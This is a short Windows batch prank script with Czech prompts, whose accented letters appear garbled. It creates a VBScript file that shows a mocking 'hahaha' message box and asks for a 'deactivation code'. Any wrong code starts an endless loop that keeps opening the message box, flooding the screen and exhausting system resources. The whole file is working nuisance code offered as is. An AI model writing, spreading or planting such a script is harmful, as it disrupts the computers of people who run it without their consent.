@echo off
echo x=msgbox("hahahahahahahahahahahahahahahahahahahahahahahhahahahahahahaha :D",0,"TvÖj milovanÏ poü°taü") >test.vbs
echo zadej deaktivaün° k¢d
set /p test=:
if %test%==1029 goto 666
if %test% LSS 1029 goto znova
if %test% GTR 1029 goto znova
:znova
start test.vbs
goto znova
:666
exit